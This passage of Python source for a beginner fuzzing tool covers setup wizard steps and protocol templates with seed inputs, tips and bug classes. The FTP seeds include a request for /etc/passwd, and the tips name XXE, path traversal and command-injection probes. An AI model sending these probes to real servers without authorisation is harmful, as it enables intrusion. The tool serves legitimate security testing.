**Good Seeds:**
- Small files (< 1KB ideal)
- Cover different program features
- Include edge cases if known

**Examples:**
- For an image parser: small valid images
- For a JSON parser: various JSON structures
- For a PDF reader: simple PDF files

**No Seeds?**
That's okay! We can generate basic seeds automatically.
But providing your own seeds will improve results.

**Tip:** If you have test files for your program, those make great seeds!
            """,
            help_text="Upload example inputs or let us generate them",
            required=False,
            can_skip=True,
            next_step=WizardStep.REVIEW_CONFIG,
            prev_step=WizardStep.CONFIGURE_MODE,
            input_fields=[
                {
                    "name": "seed_files",
                    "type": "file_multiple",
                    "label": "Upload Seed Files",
                    "accept": "*",
                    "multiple": True,
                },
                {
                    "name": "seed_dir",
                    "type": "text",
                    "label": "Or enter path to seed directory",
                    "placeholder": "/path/to/seeds/",
                },
                {
                    "name": "auto_generate",
                    "type": "checkbox",
                    "label": "Auto-generate basic seeds if none provided",
                    "default": True,
                },
            ],
        ),
        
        WizardStep.REVIEW_CONFIG: WizardStepInfo(
            step=WizardStep.REVIEW_CONFIG,
            title="Review Configuration ✅",
            description="Let's make sure everything looks right",
            explanation="""
**Configuration Summary:**
Review your settings before starting. You can go back and change anything.

**What Will Happen:**
1. We'll start testing your program with mutated inputs
2. Any crashes or hangs will be saved and analyzed
3. You can monitor progress in real-time
4. Interesting findings will be highlighted

**How Long to Run:**
- Quick test: 15-30 minutes
- Thorough test: Several hours
- Deep test: Days to weeks

You can stop anytime and resume later. Crashes are saved automatically.

**Ready?**
Click "Start Fuzzing" to begin!
            """,
            help_text="Review settings and start fuzzing",
            required=True,
            can_skip=False,
            next_step=WizardStep.START_FUZZING,
            prev_step=WizardStep.ADD_SEEDS,
        ),
        
        WizardStep.START_FUZZING: WizardStepInfo(
            step=WizardStep.START_FUZZING,
            title="Starting Fuzzer 🚀",
            description="Initializing fuzzing session...",
            explanation="""
**Starting Up:**
We're now:
1. Setting up the fuzzing environment
2. Loading your seeds
3. Initializing coverage tracking
4. Starting the fuzzing engine

**What to Watch:**
- **Executions/sec:** How fast we're testing
- **Coverage:** Code paths discovered
- **Crashes:** Potential bugs found
- **Queue:** Interesting inputs to explore

This may take a moment to start...
            """,
            help_text="Fuzzing session is starting",
            required=True,
            can_skip=False,
            next_step=WizardStep.COMPLETE,
            prev_step=WizardStep.REVIEW_CONFIG,
        ),
        
        WizardStep.COMPLETE: WizardStepInfo(
            step=WizardStep.COMPLETE,
            title="Fuzzing Started! 🎉",
            description="Your fuzzing session is running",
            explanation="""
**Success!**
Your fuzzing session is now running. Here's what to do next:

**Monitor Progress:**
- Watch the dashboard for real-time stats
- Check for new crashes periodically
- Coverage should grow over time

**When You Find Crashes:**
1. Don't panic - crashes are what we're looking for!
2. Check the crash details for severity
3. Try to reproduce with the saved input
4. Report bugs responsibly

**Tips:**
- Let it run for at least 30 minutes for initial results
- More time = more bugs found
- Check back periodically

Good luck finding bugs! 🐛🔍
            """,
            help_text="Fuzzing is active - monitor the dashboard",
            required=False,
            can_skip=False,
            next_step=None,
            prev_step=None,
        ),
    }
    
    def __init__(self):
        self.state = WizardState()
        self.auto_detector = BinaryAutoDetector()
    
    def get_step_info(self, step: Optional[WizardStep] = None) -> Dict[str, Any]:
        """Get information about a wizard step."""
        step = step or self.state.current_step
        step_info = self.STEPS.get(step)
        
        if not step_info:
            return {"error": "Unknown step"}
        
        # Customize explanation with detected values
        explanation = step_info.explanation
        if self.state.binary_analysis:
            analysis = self.state.binary_analysis
            explanation = explanation.replace(
                "{detected_input}",
                analysis.get("input_type", "file")
            )
            explanation = explanation.replace(
                "{recommended_timeout}",
                str(analysis.get("suggested_timeout_ms", 5000))
            )
            explanation = explanation.replace(
                "{qemu_recommendation}",
                "QEMU enabled" if analysis.get("is_stripped", True) else "QEMU disabled"
            )
        
        return {
            "step": step_info.step.value,
            "title": step_info.title,
            "description": step_info.description,
            "explanation": explanation.strip(),
            "help_text": step_info.help_text,
            "required": step_info.required,
            "can_skip": step_info.can_skip,
            "has_next": step_info.next_step is not None,
            "has_prev": step_info.prev_step is not None,
            "input_fields": step_info.input_fields,
            "state": self.state.to_dict(),
        }
    
    def next_step(self, user_input: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Advance to the next step."""
        current = self.STEPS.get(self.state.current_step)
        
        if not current:
            return {"error": "Invalid current step"}
        
        # Process user input
        if user_input:
            self.state.user_choices[current.step.value] = user_input
            self._apply_user_input(user_input)
        
        # Mark current step complete
        if current.step.value not in self.state.completed_steps:
            self.state.completed_steps.append(current.step.value)
        
        # Move to next step
        if current.next_step:
            self.state.current_step = current.next_step
            
            # Auto-run analysis step
            if self.state.current_step == WizardStep.ANALYZE_BINARY:
                self._run_analysis()
        
        return self.get_step_info()
    
    def prev_step(self) -> Dict[str, Any]:
        """Go back to the previous step."""
        current = self.STEPS.get(self.state.current_step)
        
        if current and current.prev_step:
            self.state.current_step = current.prev_step
        
        return self.get_step_info()
    
    def skip_step(self) -> Dict[str, Any]:
        """Skip the current step if allowed."""
        current = self.STEPS.get(self.state.current_step)
        
        if current and current.can_skip and current.next_step:
            self.state.current_step = current.next_step
        
        return self.get_step_info()
    
    def _apply_user_input(self, user_input: Dict[str, Any]):
        """Apply user input to wizard state."""
        if "binary_path" in user_input:
            self.state.target_path = user_input["binary_path"]
        
        if "target_args" in user_input:
            self.state.target_args = user_input["target_args"]
        
        if "timeout_ms" in user_input:
            self.state.timeout_ms = int(user_input["timeout_ms"])
        
        if "memory_limit_mb" in user_input:
            self.state.memory_limit_mb = int(user_input["memory_limit_mb"])
        
        if "fuzzing_mode" in user_input:
            mode_map = {
                "coverage_guided": FuzzingMode.COVERAGE_GUIDED,
                "dumb": FuzzingMode.DUMB,
                "grammar_based": FuzzingMode.GRAMMAR_BASED,
            }
            self.state.mode = mode_map.get(user_input["fuzzing_mode"], FuzzingMode.COVERAGE_GUIDED)
        
        if "use_qemu" in user_input:
            self.state.use_qemu = bool(user_input["use_qemu"])
        
        if "seed_dir" in user_input:
            self.state.seed_dir = user_input["seed_dir"]
    
    def _run_analysis(self):
        """Run binary analysis."""
        if self.state.target_path:
            result = self.auto_detector.analyze(self.state.target_path)
            self.state.binary_analysis = result.to_dict()
            
            # Apply detected settings
            self.state.target_args = result.suggested_args
            self.state.timeout_ms = result.suggested_timeout_ms
            self.state.memory_limit_mb = result.suggested_memory_mb
            self.state.mode = result.suggested_mode
            self.state.use_qemu = result.is_stripped
    
    def get_configuration(self) -> Dict[str, Any]:
        """Get the final fuzzing configuration."""
        return {
            "target_path": self.state.target_path,
            "target_args": self.state.target_args,
            "timeout_ms": self.state.timeout_ms,
            "memory_limit_mb": self.state.memory_limit_mb,
            "mode": self.state.mode.value,
            "seed_dir": self.state.seed_dir,
            "output_dir": self.state.output_dir,
            "use_qemu": self.state.use_qemu,
            "binary_analysis": self.state.binary_analysis,
        }
    
    def get_progress(self) -> Dict[str, Any]:
        """Get wizard progress information."""
        total_steps = len(self.STEPS)
        completed = len(self.state.completed_steps)
        
        return {
            "current_step": self.state.current_step.value,
            "completed_steps": self.state.completed_steps,
            "total_steps": total_steps,
            "completed_count": completed,
            "progress_percent": (completed / total_steps) * 100,
        }
    
    def reset(self):
        """Reset the wizard to the beginning."""
        self.state = WizardState()
        return self.get_step_info()


# =============================================================================
# FUZZING TEMPLATES (Beginner Feature 3)
# =============================================================================

class TemplateCategory(str, Enum):
    """Categories of fuzzing templates."""
    FILE_PARSERS = "file_parsers"
    NETWORK = "network"
    CLI_TOOLS = "cli_tools"
    INTERPRETERS = "interpreters"
    COMPRESSION = "compression"
    CRYPTO = "crypto"
    MEDIA = "media"
    DOCUMENTS = "documents"


@dataclass
class FuzzingTemplate:
    """A pre-built fuzzing configuration template."""
    id: str
    name: str
    category: TemplateCategory
    description: str
    beginner_description: str  # Plain English explanation
    
    # Configuration
    target_args: str = "@@"
    timeout_ms: int = 5000
    memory_limit_mb: int = 256
    mode: FuzzingMode = FuzzingMode.COVERAGE_GUIDED
    use_qemu: bool = False
    
    # Seed generation
    seed_generator: Optional[str] = None  # Function name for seed generation
    example_seeds: List[bytes] = field(default_factory=list)
    
    # Dictionary
    dictionary_words: List[str] = field(default_factory=list)
    
    # Tips for this type
    tips: List[str] = field(default_factory=list)
    common_bugs: List[str] = field(default_factory=list)
    
    # Matching patterns
    file_extensions: List[str] = field(default_factory=list)
    magic_bytes: List[bytes] = field(default_factory=list)
    function_hints: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "category": self.category.value,
            "description": self.description,
            "beginner_description": self.beginner_description,
            "target_args": self.target_args,
            "timeout_ms": self.timeout_ms,
            "memory_limit_mb": self.memory_limit_mb,
            "mode": self.mode.value,
            "use_qemu": self.use_qemu,
            "tips": self.tips,
            "common_bugs": self.common_bugs,
            "file_extensions": self.file_extensions,
        }


class FuzzingTemplateLibrary:
    """
    Library of pre-built fuzzing templates for common target types.
    
    Makes fuzzing accessible by providing optimized configurations
    for common use cases - no expertise required!
    """
    
    TEMPLATES: Dict[str, FuzzingTemplate] = {
        # === FILE PARSERS ===
        "image_parser": FuzzingTemplate(
            id="image_parser",
            name="Image Parser/Viewer",
            category=TemplateCategory.FILE_PARSERS,
            description="For programs that read and process image files (PNG, JPEG, GIF, BMP, etc.)",
            beginner_description="""
🖼️ **Image Parser Template**

Use this for programs that open or convert images. These are great targets 
because image formats are complex and often have parsing bugs.

**Examples:** Image viewers, converters, thumbnail generators, image editors
            """,
            target_args="@@",
            timeout_ms=3000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Minimal PNG
                b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82',
                # Minimal GIF
                b'GIF89a\x01\x00\x01\x00\x00\x00\x00;\x00',
                # Minimal BMP
                b'BM>\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00',
            ],
            dictionary_words=["IHDR", "IDAT", "IEND", "PLTE", "tRNS", "gAMA", "cHRM", "sRGB", "JFIF", "Exif"],
            tips=[
                "Start with small, valid images (1x1 pixel is fine)",
                "Include different color depths (8-bit, 24-bit, 32-bit)",
                "Try both interlaced and non-interlaced images",
                "Include images with transparency",
            ],
            common_bugs=[
                "Heap buffer overflow when parsing dimensions",
                "Integer overflow in image size calculations",
                "Out-of-bounds read in color palette handling",
                "Use-after-free in progressive decoding",
            ],
            file_extensions=[".png", ".jpg", ".jpeg", ".gif", ".bmp", ".tiff", ".webp", ".ico"],
            magic_bytes=[b'\x89PNG', b'\xff\xd8\xff', b'GIF8', b'BM', b'II*\x00', b'MM\x00*'],
            function_hints=["png_", "jpeg_", "gif_", "bmp_", "image_", "decode", "pixel"],
        ),
        
        "json_parser": FuzzingTemplate(
            id="json_parser",
            name="JSON Parser",
            category=TemplateCategory.FILE_PARSERS,
            description="For programs that parse JSON data",
            beginner_description="""
📋 **JSON Parser Template**

Use this for programs that read JSON files or API responses. JSON parsers 
can have bugs in handling deep nesting, special characters, and edge cases.

**Examples:** Config file readers, API clients, data processors
            """,
            target_args="@@",
            timeout_ms=2000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'{}',
                b'[]',
                b'{"key": "value"}',
                b'{"num": 123, "arr": [1,2,3], "nested": {"a": true}}',
                b'[1, 2, 3, "string", null, true, false]',
            ],
            dictionary_words=["true", "false", "null", '":"', '","', '":', '{"', '"}', '["', '"]'],
            tips=[
                "Include deeply nested objects",
                "Test with very long strings",
                "Include Unicode and escape sequences",
                "Try scientific notation numbers",
            ],
            common_bugs=[
                "Stack overflow from deep nesting",
                "Buffer overflow from long strings",
                "Integer overflow in number parsing",
                "Memory leak from parsing errors",
            ],
            file_extensions=[".json"],
            magic_bytes=[b'{', b'['],
            function_hints=["json_", "parse", "decode", "load"],
        ),
        
        "xml_parser": FuzzingTemplate(
            id="xml_parser",
            name="XML/HTML Parser",
            category=TemplateCategory.FILE_PARSERS,
            description="For programs that parse XML or HTML documents",
            beginner_description="""
📄 **XML/HTML Parser Template**

Use this for programs that process XML or HTML. These parsers handle complex 
nested structures and are common sources of security vulnerabilities.

**Examples:** Web browsers, document processors, config parsers, feed readers
            """,
            target_args="@@",
            timeout_ms=5000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'<?xml version="1.0"?><root/>',
                b'<html><head></head><body></body></html>',
                b'<?xml version="1.0"?><root><child attr="value">text</child></root>',
                b'<!DOCTYPE html><html><body><p>test</p></body></html>',
            ],
            dictionary_words=["<?xml", "<!DOCTYPE", "CDATA", "xmlns", "&amp;", "&lt;", "&gt;", "<!ENTITY"],
            tips=[
                "Include XML entities and CDATA sections",
                "Test with malformed documents",
                "Try XXE (XML External Entity) patterns",
                "Include deeply nested elements",
            ],
            common_bugs=[
                "XXE (XML External Entity) injection",
                "Billion laughs attack (entity expansion)",
                "Buffer overflow in attribute parsing",
                "Stack overflow from deep nesting",
            ],
            file_extensions=[".xml", ".html", ".htm", ".xhtml", ".svg"],
            magic_bytes=[b'<?xml', b'<!DOCTYPE', b'<html', b'<HTML'],
            function_hints=["xml_", "html_", "parse", "sax", "dom"],
        ),
        
        "pdf_parser": FuzzingTemplate(
            id="pdf_parser",
            name="PDF Reader/Parser",
            category=TemplateCategory.DOCUMENTS,
            description="For programs that read and display PDF files",
            beginner_description="""
📑 **PDF Parser Template**

Use this for PDF readers and processors. PDFs are very complex and have 
historically been a rich source of security vulnerabilities.

**Examples:** PDF viewers, converters, text extractors, print processors
            """,
            target_args="@@",
            timeout_ms=10000,
            memory_limit_mb=1024,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000052 00000 n \n0000000101 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n178\n%%EOF',
            ],
            dictionary_words=["obj", "endobj", "stream", "endstream", "xref", "trailer", "startxref", 
                             "/Type", "/Page", "/Font", "/Filter", "/FlateDecode", "/JavaScript"],
            tips=[
                "PDFs can be very slow to parse - use longer timeouts",
                "Include PDFs with embedded JavaScript",
                "Try different compression filters",
                "Include forms and annotations",
            ],
            common_bugs=[
                "Heap overflow in stream decompression",
                "Use-after-free in font handling",
                "Type confusion in object parsing",
                "JavaScript engine vulnerabilities",
            ],
            file_extensions=[".pdf"],
            magic_bytes=[b'%PDF'],
            function_hints=["pdf_", "stream", "object", "xref", "catalog"],
        ),
        
        # === NETWORK ===
        "http_server": FuzzingTemplate(
            id="http_server",
            name="HTTP Server/Handler",
            category=TemplateCategory.NETWORK,
            description="For HTTP servers and request handlers",
            beginner_description="""
🌐 **HTTP Server Template**

Use this for web servers and HTTP handlers. Web servers process untrusted 
network input, making them critical security targets.

**Examples:** Web servers, REST APIs, CGI handlers, reverse proxies
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
                b'POST /api HTTP/1.1\r\nHost: localhost\r\nContent-Length: 13\r\n\r\n{"key":"val"}',
                b'GET /path?param=value HTTP/1.0\r\n\r\n',
            ],
            dictionary_words=["GET", "POST", "PUT", "DELETE", "HTTP/1.1", "Host:", "Content-Length:", 
                             "Content-Type:", "Cookie:", "Authorization:", "\r\n"],
            tips=[
                "Test different HTTP methods",
                "Include various headers",
                "Try chunked transfer encoding",
                "Test with malformed requests",
            ],
            common_bugs=[
                "Request smuggling",
                "Header injection",
                "Buffer overflow in URL parsing",
                "Integer overflow in Content-Length",
            ],
            file_extensions=[],
            magic_bytes=[b'GET ', b'POST ', b'PUT ', b'HEAD '],
            function_hints=["http_", "request", "response", "header", "url", "parse"],
        ),
        
        "dns_parser": FuzzingTemplate(
            id="dns_parser",
            name="DNS Parser/Resolver",
            category=TemplateCategory.NETWORK,
            description="For DNS parsers and resolvers",
            beginner_description="""
🔍 **DNS Parser Template**

Use this for DNS clients, servers, or libraries. DNS parsing bugs can lead 
to serious security issues including remote code execution.

**Examples:** DNS resolvers, DNS servers, network tools
            """,
            target_args="@@",
            timeout_ms=3000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Simple DNS query for example.com
                b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',
            ],
            dictionary_words=[],
            tips=[
                "Include compressed domain names",
                "Test with pointer loops",
                "Try oversized labels",
                "Include various record types",
            ],
            common_bugs=[
                "Buffer overflow in name decompression",
                "Infinite loop from compression pointers",
                "Off-by-one in label length",
                "Integer overflow in message length",
            ],
            file_extensions=[],
            magic_bytes=[],
            function_hints=["dns_", "resolve", "query", "domain", "label"],
        ),
        
        "ftp_server": FuzzingTemplate(
            id="ftp_server",
            name="FTP Server/Client",
            category=TemplateCategory.NETWORK,
            description="For FTP servers and clients",
            beginner_description="""
📁 **FTP Server/Client Template**

Use this for File Transfer Protocol implementations. FTP is an old protocol 
with many security-sensitive commands and complex state machines.

**Examples:** FTP servers, FTP clients, backup tools, file sync utilities
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'USER anonymous\r\n',
                b'PASS test@test.com\r\n',
                b'LIST\r\n',
                b'RETR /etc/passwd\r\n',
                b'STOR test.txt\r\n',
                b'PWD\r\n',
                b'CWD /tmp\r\n',
                b'PASV\r\n',
                b'PORT 192,168,1,1,4,1\r\n',
                b'QUIT\r\n',
            ],
            dictionary_words=[
                "USER", "PASS", "ACCT", "CWD", "CDUP", "SMNT", "QUIT", "REIN", "PORT", "PASV",
                "TYPE", "STRU", "MODE", "RETR", "STOR", "STOU", "APPE", "ALLO", "REST", "RNFR",
                "RNTO", "ABOR", "DELE", "RMD", "MKD", "PWD", "LIST", "NLST", "SITE", "SYST",
                "STAT", "HELP", "NOOP", "SIZE", "MDTM", "FEAT", "OPTS", "AUTH", "PBSZ", "PROT",
                "\r\n", "anonymous", "ftp", "root", "admin",
            ],
            tips=[
                "Test command injection through filenames",
                "Try path traversal sequences",
                "Test PASV mode IP parsing (SSRF potential)",
                "Fuzz authentication sequences",
                "Try commands in unexpected states",
            ],
            common_bugs=[
                "Path traversal in RETR/STOR commands",
                "Buffer overflow in filename handling",
                "Command injection via filenames",
                "SSRF via PASV/PORT commands",
                "Auth bypass through state confusion",
                "Crash on malformed PORT parameters",
            ],
            file_extensions=[],
            magic_bytes=[b'220 ', b'USER ', b'PASS '],
            function_hints=["ftp_", "stor", "retr", "list", "pasv", "port", "auth"],
        ),
        
        "smtp_server": FuzzingTemplate(
            id="smtp_server",
            name="SMTP Mail Server",
            category=TemplateCategory.NETWORK,
            description="For email servers and SMTP handlers",
            beginner_description="""
📧 **SMTP Mail Server Template**

Use this for Simple Mail Transfer Protocol servers. Email servers are critical 
infrastructure and bugs can lead to spam, data leaks, or server compromise.

**Examples:** Email servers (Postfix, Exim, sendmail), mail handlers
            """,
            target_args="",
            timeout_ms=15000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                b'EHLO localhost\r\n',
                b'HELO localhost\r\n',
                b'MAIL FROM:<test@example.com>\r\n',
                b'RCPT TO:<admin@target.com>\r\n',
                b'DATA\r\n',
                b'Subject: Test\r\n\r\nHello World\r\n.\r\n',
                b'QUIT\r\n',
                b'VRFY root\r\n',
                b'EXPN users\r\n',
                b'RSET\r\n',
                b'NOOP\r\n',
                b'AUTH LOGIN\r\n',
            ],
            dictionary_words=[
                "HELO", "EHLO", "MAIL", "RCPT", "DATA", "QUIT", "RSET", "VRFY", "EXPN", "NOOP",
                "AUTH", "STARTTLS", "FROM:", "TO:", "SIZE=", "8BITMIME", "PIPELINING",
                "Subject:", "Content-Type:", "Content-Transfer-Encoding:", "MIME-Version:",
                "From:", "To:", "Date:", "Message-ID:", "Received:", "Return-Path:",
                "\r\n", "\r\n.\r\n", "<>", "postmaster", "root", "admin",
                "LOGIN", "PLAIN", "CRAM-MD5", "DIGEST-MD5",
            ],
            tips=[
                "Test email address parsing edge cases",
                "Try header injection through addresses",
                "Fuzz MIME boundaries and encoding",
                "Test SIZE limits and memory handling",
                "Try commands during DATA state",
            ],
            common_bugs=[
                "Command injection in email addresses",
                "Header injection via MAIL FROM/RCPT TO",
                "Buffer overflow in long addresses",
                "SMTP smuggling vulnerabilities",
                "Auth bypass through state confusion",
                "DoS via malformed MIME messages",
            ],
            file_extensions=[".eml", ".msg"],
            magic_bytes=[b'220 ', b'EHLO', b'HELO', b'MAIL FROM:'],
            function_hints=["smtp_", "mail", "rcpt", "data", "helo", "ehlo", "envelope"],
        ),
        
        "mqtt_broker": FuzzingTemplate(
            id="mqtt_broker",
            name="MQTT Broker/Client",
            category=TemplateCategory.NETWORK,
            description="For MQTT message brokers and IoT clients",
            beginner_description="""
🌐 **MQTT Broker/Client Template**

Use this for MQTT (Message Queuing Telemetry Transport) implementations. 
MQTT is widely used in IoT devices, making vulnerabilities highly impactful.

**Examples:** MQTT brokers (Mosquitto), IoT devices, home automation
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=256,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # CONNECT packet (protocol 3.1.1, clean session, keepalive 60s)
                b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test',
                # PUBLISH packet (QoS 0, topic "test", message "hello")
                b'\x30\x0c\x00\x04test\x00hello',
                # SUBSCRIBE packet
                b'\x82\x09\x00\x01\x00\x04test\x00',
                # PING request
                b'\xc0\x00',
                # DISCONNECT
                b'\xe0\x00',
            ],
            dictionary_words=[
                "MQTT", "\x00", "\x04", "test", "topic", "#", "+", "/",
                "client", "device", "sensor", "actuator", "home", "iot",
            ],
            tips=[
                "Test topic filter wildcards (#, +)",
                "Fuzz variable-length integer encoding",
                "Try extremely long topic names",
                "Test QoS level handling",
                "Fuzz client ID generation/handling",
            ],
            common_bugs=[
                "Buffer overflow in topic parsing",
                "Integer overflow in remaining length",
                "Topic validation bypass (ACL issues)",
                "Memory exhaustion via large messages",
                "Crash on malformed packet types",
                "State confusion between sessions",
            ],
            file_extensions=[],
            magic_bytes=[b'\x10', b'\x30', b'\x82', b'\xc0'],
            function_hints=["mqtt_", "publish", "subscribe", "connect", "topic", "qos"],
        ),
        
        "websocket_server": FuzzingTemplate(
            id="websocket_server",
            name="WebSocket Server",
            category=TemplateCategory.NETWORK,
            description="For WebSocket servers and handlers",
            beginner_description="""
🔌 **WebSocket Server Template**

Use this for WebSocket implementations. WebSockets enable real-time 
bidirectional communication and are common in modern web applications.

**Examples:** WebSocket servers, chat applications, live dashboards, gaming
            """,
            target_args="",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # HTTP upgrade request
                b'GET /ws HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n',
                # Text frame: "Hello"
                b'\x81\x85\x37\xfa\x21\x3d\x7f\x9f\x4d\x51\x58',
                # Binary frame
                b'\x82\x85\x37\xfa\x21\x3d\x7f\x9f\x4d\x51\x58',
                # Ping frame
                b'\x89\x80\x00\x00\x00\x00',
                # Close frame
                b'\x88\x82\x00\x00\x00\x00\x03\xe8',
                # Continuation frame
                b'\x00\x85\x37\xfa\x21\x3d\x7f\x9f\x4d\x51\x58',
            ],
            dictionary_words=[
                "Upgrade", "websocket", "Connection", "Sec-WebSocket-Key",
                "Sec-WebSocket-Version", "Sec-WebSocket-Protocol", "Sec-WebSocket-Extensions",
                "permessage-deflate", "13", "HTTP/1.1", "\r\n",
            ],
            tips=[
                "Test frame fragmentation handling",
                "Fuzz masking key and payload",
                "Try oversized frame lengths",
                "Test extension negotiation",
                "Fuzz close codes and reasons",
            ],
            common_bugs=[
                "Integer overflow in frame length",
                "Buffer overflow in message assembly",
                "Denial of service via fragmentation",
                "Memory exhaustion via large frames",
                "Crash on invalid close codes",
                "State confusion during handshake",
            ],
            file_extensions=[],
            magic_bytes=[b'\x81', b'\x82', b'\x89', b'GET /'],
            function_hints=["websocket", "ws_", "frame", "mask", "handshake", "upgrade"],
        ),
        
        "grpc_server": FuzzingTemplate(
            id="grpc_server",
            name="gRPC/Protocol Buffers",
            category=TemplateCategory.NETWORK,
            description="For gRPC services and Protocol Buffer parsers",
            beginner_description="""
⚡ **gRPC/Protobuf Template**

Use this for gRPC servers and Protocol Buffer message parsing. gRPC is 
used heavily in microservices and cloud infrastructure.

**Examples:** gRPC services, microservices, Kubernetes components
            """,
            target_args="@@",
            timeout_ms=10000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # Simple protobuf: field 1 = varint 150
                b'\x08\x96\x01',
                # Protobuf with string: field 2 = "testing"
                b'\x12\x07testing',
                # Nested message example
                b'\x1a\x03\x08\x96\x01',
                # Repeated field
                b'\x08\x01\x08\x02\x08\x03',
                # gRPC frame header + small message
                b'\x00\x00\x00\x00\x05\x08\x96\x01\x10\x01',
            ],
            dictionary_words=[
                "\x08", "\x10", "\x18", "\x20", "\x28", "\x30",  # field tags
                "\x12", "\x1a", "\x22", "\x2a", "\x32", "\x3a",  # length-delimited
                "\x00\x00\x00\x00",  # gRPC frame header
            ],
            tips=[
                "Generate fuzz targets from .proto files",
                "Test field number edge cases (1, max)",
                "Fuzz nested message depth",
                "Try invalid wire types for fields",
                "Test repeated field limits",
            ],
            common_bugs=[
                "Stack overflow via deeply nested messages",
                "Integer overflow in varint decoding",
                "Buffer overflow in length-delimited fields",
                "Memory exhaustion via repeated fields",
                "Type confusion in oneof handling",
                "Crash on unknown field types",
            ],
            file_extensions=[".pb", ".proto", ".bin"],
            magic_bytes=[b'\x08', b'\x0a', b'\x12', b'\x00\x00\x00\x00'],
            function_hints=["proto", "grpc", "parse", "serialize", "varint", "message"],
        ),
        
        "ssh_server": FuzzingTemplate(
            id="ssh_server",
            name="SSH Server/Client",
            category=TemplateCategory.NETWORK,
            description="For SSH protocol implementations",
            beginner_description="""
🔐 **SSH Server/Client Template**

Use this for Secure Shell implementations. SSH vulnerabilities are critical 
as they can lead to complete server compromise. Fuzz carefully!

**Examples:** SSH servers (OpenSSH, Dropbear), SSH clients, SFTP handlers
            """,
            target_args="",
            timeout_ms=15000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            use_qemu=True,  # Often testing closed-source or hardened binaries
            example_seeds=[
                # SSH version banner
                b'SSH-2.0-OpenSSH_8.9\r\n',
                # Key exchange init (simplified)
                b'\x00\x00\x00\x1c\x06\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00curve25519-sha256',
                # Disconnect message
                b'\x00\x00\x00\x0c\x05\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00',
            ],
            dictionary_words=[
                "SSH-2.0-", "SSH-1.5-", "OpenSSH", "curve25519-sha256", "ssh-ed25519",
                "ssh-rsa", "ecdsa-sha2-nistp256", "aes256-ctr", "chacha20-poly1305",
                "hmac-sha2-256", "none", "zlib", "publickey", "password", "keyboard-interactive",
            ],
            tips=[
                "Test version string parsing carefully",
                "Fuzz key exchange algorithm selection",
                "Try invalid packet lengths",
                "Test authentication state machine",
                "Fuzz channel request handling",
            ],
            common_bugs=[
                "Buffer overflow in version parsing",
                "Integer overflow in packet length",
                "Auth bypass through state confusion",
                "Memory corruption in key handling",
                "Crash on malformed channel requests",
                "Information leak via timing attacks",
            ],
            file_extensions=[],
            magic_bytes=[b'SSH-'],
            function_hints=["ssh_", "kex", "channel", "auth", "packet", "cipher"],
        ),
        
        "tls_handler": FuzzingTemplate(
            id="tls_handler",
            name="TLS/SSL Handler",
            category=TemplateCategory.NETWORK,
            description="For TLS/SSL implementations and certificate parsing",
            beginner_description="""
🔒 **TLS/SSL Handler Template**

Use this for Transport Layer Security implementations. TLS bugs can 
expose encrypted traffic or allow man-in-the-middle attacks.

**Examples:** TLS libraries (OpenSSL, BoringSSL), HTTPS servers
            """,
            target_args="@@",
            timeout_ms=15000,
            memory_limit_mb=512,
            mode=FuzzingMode.COVERAGE_GUIDED,
            example_seeds=[
                # TLS 1.2 ClientHello (simplified)
                b'\x16\x03\x01\x00\x05\x01\x00\x00\x01\x03',
                # TLS Alert (warning, close_notify)
                b'\x15\x03\x03\x00\x02\x01\x00',
                # TLS Heartbeat (heartbleed-style, but safe size)
                b'\x18\x03\x02\x00\x03\x01\x00\x01',
                # Certificate message skeleton
                b'\x16\x03\x03\x00\x07\x0b\x00\x00\x03\x00\x00\x00',
            ],
            dictionary_words=[
